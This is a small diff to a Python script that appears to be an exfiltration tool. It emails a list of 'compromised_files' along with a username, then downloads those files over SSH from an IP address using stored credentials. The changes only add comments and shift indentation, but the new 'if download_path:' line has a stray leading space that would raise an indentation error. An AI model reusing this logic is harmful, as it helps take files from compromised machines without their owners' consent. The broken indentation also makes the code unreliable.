@@ -114,10 +114,11 @@ def main():
 
     send_email(sender_email, sender_password, recipient_email, compromised_files, username)
 
-    if download_path:
+     if download_path:
+        # Download files to the specified path
         download_files_ssh(compromised_files, download_path, ip_address, username, password)
     else:
-        # If no download path is given, download the smallest compromised file
+        # If no download path is given, download the smallest compromised file to the current directory
         smallest_file = min(compromised_files, key=os.path.getsize)
         download_files_ssh([smallest_file], '.', ip_address, username, password)
 
